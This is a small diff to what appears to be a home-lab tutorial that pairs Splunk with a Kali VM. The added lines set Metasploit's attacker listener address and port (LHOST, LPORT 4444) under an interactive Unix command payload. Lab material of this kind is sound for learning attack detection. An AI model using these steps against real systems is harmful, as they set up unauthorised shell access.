@@ -134,7 +134,12 @@ Install Splunk:
 - Set the payload shown:
 
   `set payload payload/cmd/unix/interact`
-  
+- Set the attacker's IP address and listening port using the Kali VM IP:
+  ```
+  set LHOST <KALI-VM-IP>
+  SET LPORT 4444
+  ```
+
 
 
 
